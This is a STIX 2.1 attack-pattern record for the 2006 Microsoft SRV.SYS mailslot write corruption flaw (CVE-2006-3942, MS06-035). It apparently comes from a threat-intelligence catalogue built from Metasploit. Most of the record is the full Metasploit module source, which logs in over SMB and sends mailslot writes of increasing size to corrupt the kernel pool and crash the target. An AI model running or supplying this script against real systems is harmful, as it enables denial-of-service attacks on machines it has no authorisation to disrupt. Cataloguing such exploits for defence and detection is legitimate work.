{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d191f11b-5624-4ec1-9d71-d2b3463eaaba",
    "created": "2024-08-14T16:25:39.921289Z",
    "modified": "2024-08-14T16:25:39.921292Z",
    "name": "Microsoft SRV.SYS Mailslot Write Corruption",
    "description": " This module triggers a kernel pool corruption bug in SRV.SYS. Each call to the mailslot write function results in a two byte return value being written into the response packet. The code which creates this packet fails to consider these two bytes in the allocation routine, resulting in a slow corruption of the kernel memory pool. These two bytes are almost always set to \"\\xff\\xff\" (a short integer with value of -1).  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/smb/ms06_035_mailslot.rb",
            "external_id": "ms06_035_mailslot.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-3942"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/common/showdoc.php?idx=562&idxseccion=10"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft SRV.SYS Mailslot Write Corruption',\n      'Description'    => %q{\n        This module triggers a kernel pool corruption bug in SRV.SYS. Each\n      call to the mailslot write function results in a two byte return value\n      being written into the response packet. The code which creates this packet\n      fails to consider these two bytes in the allocation routine, resulting in\n      a slow corruption of the kernel memory pool. These two bytes are almost\n      always set to \"\\xff\\xff\" (a short integer with value of -1).\n      },\n\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['BID', '19215'],\n          ['OSVDB', '27644'],\n          ['CVE', '2006-3942'],\n          ['URL', 'http://www.coresecurity.com/common/showdoc.php?idx=562&idxseccion=10'],\n          ['MSB', 'MS06-035'],\n        ],\n      'Actions'     =>\n        [\n          ['Attack', 'Description' => 'Run Denial of Service'],\n        ],\n      'DefaultAction' => 'Attack',\n      'DisclosureDate' => '2006-07-11'\n    ))\n\n    register_options(\n      [\n        OptString.new('MAILSLOT', [ true,  \"The mailslot name to use\", 'Alerter']),\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  # MAILSLOT: HydraLsServer\n  # MAILSLOT: Messngr\n  # MAILSLOT: 53cb31a0\\\\UnimodemNotifyTSP\n\n  def run\n\n    case action.name\n    when 'Attack'\n\n      print_status(\"Mangling the kernel, two bytes at a time...\");\n\n      connect(versions: [1])\n      smb_login\n\n      1.upto(1024) do |i|\n\n        if (i % 100 == 0)\n          print_status(\"Sending request containing #{i} bytes...\")\n        end\n\n        begin\n          self.simple.client.trans_mailslot(\"\\\\MAILSLOT\\\\\"+datastore['MAILSLOT'], \"X\" * i)\n\n        rescue ::Interrupt\n          return\n\n        rescue ::Exception => e\n\n          if (i == 1)\n            print_error(\"Failed to write any data to the mailslot: #{e}\")\n            break\n          end\n          print_error(\"Exception occurred on interation #{i}\")\n          print_error(\"Error: #{e.class} > #{e}\")\n          break\n        end\n      end\n\n    # Errors:\n    #  0xc0000034 = object not found\n    #  0xc0000205 = insufficient resources (too much data)\n\n    end\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-07-11"
}